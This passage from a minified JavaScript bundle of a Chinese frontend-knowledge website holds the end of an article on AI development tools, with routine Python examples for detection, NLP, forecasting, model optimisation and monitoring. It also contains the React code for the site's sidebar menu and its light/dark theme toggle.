    return predictions
\`\`\`

**Detectron2**：Facebook的目标检测框架
\`\`\`python
from detectron2.engine import DefaultPredictor
from detectron2.config import get_cfg
from detectron2 import model_zoo

cfg = get_cfg()
cfg.MODEL.WEIGHTS = model_zoo.get_checkpoint_url("COCO-Detection/faster_rcnn_R_50_FPN_3x.yaml")
predictor = DefaultPredictor(cfg)

# 预测
outputs = predictor(image)
\`\`\`

#### 2. 自然语言处理
**spaCy**：工业级NLP库
\`\`\`python
import spacy

# 加载模型
nlp = spacy.load("en_core_web_sm")

# 文本处理
def process_text(text):
    doc = nlp(text)
    
    # 命名实体识别
    entities = [(ent.text, ent.label_) for ent in doc.ents]
    
    # 词性标注
    pos_tags = [(token.text, token.pos_) for token in doc]
    
    # 依存句法分析
    dependencies = [(token.text, token.dep_, token.head.text) for token in doc]
    
    return {
        'entities': entities,
        'pos_tags': pos_tags,
        'dependencies': dependencies
    }
\`\`\`

#### 3. 时间序列分析
**Prophet**：Facebook的时间序列预测
\`\`\`python
from fbprophet import Prophet

# 创建模型
model = Prophet(
    growth='linear',
    seasonality_mode='multiplicative',
    yearly_seasonality=True,
    weekly_seasonality=True
)

# 训练模型
model.fit(df)  # df需要有'ds'和'y'列

# 预测
future = model.make_future_dataframe(periods=365)
forecast = model.predict(future)
\`\`\`

### 🔧 模型优化工具

#### 1. 模型压缩
**TensorRT**：NVIDIA的推理优化
\`\`\`python
import tensorrt as trt
import numpy as np

def optimize_with_tensorrt(engine_path):
    # 创建TensorRT运行时
    runtime = trt.Runtime(trt.Logger(trt.Logger.WARNING))
    
    # 加载优化后的引擎
    with open(engine_path, 'rb') as f:
        engine = runtime.deserialize_cuda_engine(f.read())
    
    return engine
\`\`\`

**ONNX**：开放神经网络交换格式
\`\`\`python
import onnx
import onnxruntime as ort

# 转换模型到ONNX
torch.onnx.export(
    model,
    dummy_input,
    "model.onnx",
    export_params=True,
    opset_version=11
)

# 使用ONNX Runtime推理
session = ort.InferenceSession("model.onnx")
output = session.run(None, {'input': input_data})
\`\`\`

#### 2. 量化工具
**PyTorch Quantization**：
\`\`\`python
import torch.quantization as quant

# 准备量化
model.qconfig = torch.quantization.get_default_qconfig('fbgemm')
model_prepared = torch.quantization.prepare(model, inplace=False)

# 校准
with torch.no_grad():
    for data, target in calibration_loader:
        model_prepared(data)

# 转换为量化模型
model_quantized = torch.quantization.convert(model_prepared, inplace=False)
\`\`\`

### 📊 监控和可观测性

#### 1. 模型监控
**Prometheus + Grafana**：
\`\`\`python
from prometheus_client import Counter, Histogram, start_http_server

# 定义指标
request_counter = Counter('model_requests_total', 'Total model requests')
prediction_histogram = Histogram('prediction_time_seconds', 'Prediction time')

def predict_with_monitoring(model, input_data):
    request_counter.inc()
    
    with prediction_histogram.time():
        result = model.predict(input_data)
    
    return result

# 启动监控服务器
start_http_server(8000)
\`\`\`

#### 2. 数据漂移检测
**Alibi Detect**：
\`\`\`python
from alibi_detect.cd import MMDDrift

# 训练时数据分布
reference_data = X_train

# 创建漂移检测器
cd = MMDDrift(
    x_ref=reference_data,
    p_val=0.05,
    backend='pytorch'
)

# 检测漂移
preds = cd.predict(X_current)
if preds['data']['is_drift']:
    print("检测到数据漂移！")
\`\`\`

### 🚀 最佳实践

#### 1. 工具选择指南
- **项目规模**：小项目用简单工具，大项目用完整栈
- **团队技能**：选择团队熟悉的工具
- **预算考虑**：开源vs商业解决方案
- **合规要求**：数据安全和隐私

#### 2. 工作流程
1. **数据准备**：清洗、标注、验证
2. **模型开发**：实验、训练、验证
3. **模型优化**：压缩、量化、加速
4. **部署上线**：服务化、监控、维护
5. **持续改进**：反馈收集、模型更新

#### 3. 安全考虑
- **模型安全**：对抗攻击防护
- **数据安全**：隐私保护、访问控制
- **部署安全**：API安全、身份验证

### 🌟 未来发展趋势

#### 1. 低代码/无代码平台
- **AutoML**：自动化机器学习
- **可视化建模**：拖拽式建模
- **预构建解决方案**：行业特定模板

#### 2. 边缘AI工具
- **边缘推理**：本地模型部署
- **联邦学习**：分布式训练
- **模型压缩**：移动端优化

#### 3. 协作工具
- **团队协作**：多人同时开发
- **知识管理**：经验分享平台
- **自动化测试**：CI/CD集成

AI开发工具生态系统正在快速发展，新的工具和技术不断涌现。选择合适的工具组合，建立高效的开发流程，是成功构建AI应用的关键。随着技术的进步，AI开发将变得更加便捷和高效。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"}];e.s(["categories",0,eg,"knowledgeList",0,eh],52947);let eb=e=>{switch(e){case"easy":return"🟢";case"medium":return"🟡";case"hard":return"🔴";default:return"⚪"}};e.s(["getDifficultyColor",0,e=>{switch(e){case"easy":return"green";case"medium":return"orange";case"hard":return"red";default:return"default"}},"getDifficultyEmoji",0,eb,"getDifficultyText",0,e=>{switch(e){case"easy":return"简单";case"medium":return"中等";case"hard":return"困难";default:return"未知"}}],5330);let{Sider:ey}=i.Layout,{Title:ev,Text:eS}=s.Typography,ex={all:(0,t.jsx)(q,{}),css:(0,t.jsx)(Y,{}),javascript:(0,t.jsx)(X,{}),vue:(0,t.jsx)(ea.BookOutlined,{}),react:(0,t.jsx)(ef,{}),security:(0,t.jsx)(et,{}),performance:(0,t.jsx)(eo,{}),engineering:(0,t.jsx)(ed,{}),browser:(0,t.jsx)(el,{}),ai:(0,t.jsx)(ef,{})};function eC(){let e=(0,o.usePathname)(),i=e.split("/")[1]||"all",s=e.split("/")[2],[l,c]=(0,r.useState)("all"!==i?[i]:[]),u=[{key:"all",icon:ex.all,label:(0,t.jsxs)(n.default,{href:"/",className:"flex items-center justify-between",children:[(0,t.jsx)("span",{children:"全部知识点"}),(0,t.jsx)("span",{className:"text-xs opacity-70 bg-white/10 px-2 py-1 rounded-full",children:eh.length})]}),selected:"all"===i}];return eg.forEach(e=>{let r=eh.filter(t=>t.category===e.id).map(r=>({key:`${e.id}-${r.id}`,label:(0,t.jsxs)(n.default,{href:`/${e.id}/${r.id}`,className:"flex items-center gap-2",children:[(0,t.jsx)("span",{className:"flex-1",children:r.title}),(0,t.jsx)("span",{className:"text-xs opacity-50",children:eb(r.difficulty)})]}),selected:i===e.id&&s===r.id}));u.push({key:e.id,icon:ex[e.id]||(0,t.jsx)(ea.BookOutlined,{}),label:(0,t.jsxs)("div",{className:"flex items-center justify-between",children:[(0,t.jsx)("span",{children:e.name}),(0,t.jsx)("span",{className:"text-xs opacity-70 bg-white/10 px-2 py-1 rounded-full",children:eh.filter(t=>t.category===e.id).length})]}),selected:i===e.id&&!s,children:r.length>0?r:void 0})}),(0,t.jsxs)(ey,{width:300,theme:"light",style:{position:"fixed",left:0,top:0,height:"100vh",background:"var(--sidebar-bg)",boxShadow:"2px 0 8px rgba(0, 0, 0, 0.1)",zIndex:1e3},children:[(0,t.jsx)("div",{className:"p-6 border-b border-gray-200",children:(0,t.jsx)(n.default,{href:"/",className:"block",children:(0,t.jsxs)("div",{className:"flex items-center gap-3 mb-2",children:[(0,t.jsx)(k,{size:48,style:{background:"linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%)",border:"3px solid rgba(99, 102, 241, 0.1)"},icon:(0,t.jsx)(ea.BookOutlined,{})}),(0,t.jsxs)("div",{children:[(0,t.jsx)(ev,{level:4,style:{color:"var(--color-foreground)",margin:0,fontSize:"18px"},children:"前端知识宝典"}),(0,t.jsx)(eS,{style:{color:"var(--color-text-secondary)",fontSize:"12px"},children:"Senior Frontend Knowledge"})]})]})})}),(0,t.jsx)(a.default,{mode:"inline",openKeys:l,onOpenChange:e=>{c(e)},selectedKeys:s?[`${i}-${s}`]:[i],style:{height:"calc(100vh - 140px)",overflowY:"auto",borderRight:0,background:"transparent",paddingTop:"16px"},items:u,className:"sidebar-menu"})]})}e.s(["default",()=>eC],22140);var ew=e.i(64571);let ek={icon:{tag:"svg",attrs:{"fill-rule":"evenodd",viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M548 818v126a16 16 0 01-16 16h-40a16 16 0 01-16-16V818c15.85 1.64 27.84 2.46 36 2.46 8.15 0 20.16-.82 36-2.46m205.25-115.66l89.1 89.1a16 16 0 010 22.62l-28.29 28.29a16 16 0 01-22.62 0l-89.1-89.1c12.37-10.04 21.43-17.95 27.2-23.71 5.76-5.77 13.67-14.84 23.71-27.2m-482.5 0c10.04 12.36 17.95 21.43 23.71 27.2 5.77 5.76 14.84 13.67 27.2 23.71l-89.1 89.1a16 16 0 01-22.62 0l-28.29-28.29a16 16 0 010-22.63zM512 278c129.24 0 234 104.77 234 234S641.24 746 512 746 278 641.24 278 512s104.77-234 234-234m0 72c-89.47 0-162 72.53-162 162s72.53 162 162 162 162-72.53 162-162-72.53-162-162-162M206 476c-1.64 15.85-2.46 27.84-2.46 36 0 8.15.82 20.16 2.46 36H80a16 16 0 01-16-16v-40a16 16 0 0116-16zm738 0a16 16 0 0116 16v40a16 16 0 01-16 16H818c1.64-15.85 2.46-27.84 2.46-36 0-8.15-.82-20.16-2.46-36zM814.06 180.65l28.29 28.29a16 16 0 010 22.63l-89.1 89.09c-10.04-12.37-17.95-21.43-23.71-27.2-5.77-5.76-14.84-13.67-27.2-23.71l89.1-89.1a16 16 0 0122.62 0m-581.5 0l89.1 89.1c-12.37 10.04-21.43 17.95-27.2 23.71-5.76 5.77-13.67 14.84-23.71 27.2l-89.1-89.1a16 16 0 010-22.62l28.29-28.29a16 16 0 0122.62 0M532 64a16 16 0 0116 16v126c-15.85-1.64-27.84-2.46-36-2.46-8.15 0-20.16.82-36 2.46V80a16 16 0 0116-16z"}}]},name:"sun",theme:"outlined"};function e$(){return(e$=Object.assign.bind()).apply(this,arguments)}let eE=r.forwardRef((e,t)=>r.createElement(W.default,e$({},e,{ref:t,icon:ek}))),eP={icon:{tag:"svg",attrs:{"fill-rule":"evenodd",viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M489.5 111.66c30.65-1.8 45.98 36.44 22.58 56.33A243.35 243.35 0 00426 354c0 134.76 109.24 244 244 244 72.58 0 139.9-31.83 186.01-86.08 19.87-23.38 58.07-8.1 56.34 22.53C900.4 745.82 725.15 912 512.5 912 291.31 912 112 732.69 112 511.5c0-211.39 164.29-386.02 374.2-399.65l.2-.01zm-81.15 79.75l-4.11 1.36C271.1 237.94 176 364.09 176 511.5 176 697.34 326.66 848 512.5 848c148.28 0 274.94-96.2 319.45-230.41l.63-1.93-.11.07a307.06 307.06 0 01-159.73 46.26L670 662c-170.1 0-308-137.9-308-308 0-58.6 16.48-114.54 46.27-162.47z"}}]},name:"moon",theme:"outlined"};function eT(){return(eT=Object.assign.bind()).apply(this,arguments)}let eI=r.forwardRef((e,t)=>r.createElement(W.default,eT({},e,{ref:t,icon:eP})));function eM(){let[e,n]=(0,r.useState)(!1),[o,a]=(0,r.useState)(!1);return((0,r.useEffect)(()=>{Promise.resolve().then(()=>{let e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches,r=e?"dark"===e:t;n(r),a(!0),r?document.documentElement.setAttribute("data-theme","dark"):document.documentElement.removeAttribute("data-theme")})},[]),o)?(0,t.jsx)(ew.Button,{type:"text",icon:e?(0,t.jsx)(eE,{}):(0,t.jsx)(eI,{}),onClick:()=>{n(e=>{let t=!e;return t?(document.documentElement.setAttribute("data-theme","dark"),localStorage.setItem("theme","dark")):(document.documentElement.removeAttribute("data-theme"),localStorage.setItem("theme","light")),t})},style:{position:"absolute",top:"-10px",right:"0px",zIndex:1001,background:"rgba(255, 255, 255, 0.1)",backdropFilter:"blur(10px)",border:"1px solid rgba(0, 0, 0, 0.6)",color:e?"#f1f5f9":"#1e293b"},className:"theme-toggle-button","aria-label":"切换主题"}):(0,t.jsx)(ew.Button,{type:"text",icon:(0,t.jsx)(eI,{}),style:{position:"absolute",top:"-10px",right:"0px",zIndex:1001,background:"rgba(255, 255, 255, 0.1)",backdropFilter:"blur(10px)",border:"1px solid rgba(0, 0, 0, 0.6)",color:"#1e293b"},className:"theme-toggle-button","aria-label":"切换主题"})}e.s(["default",()=>eM],22530)}]);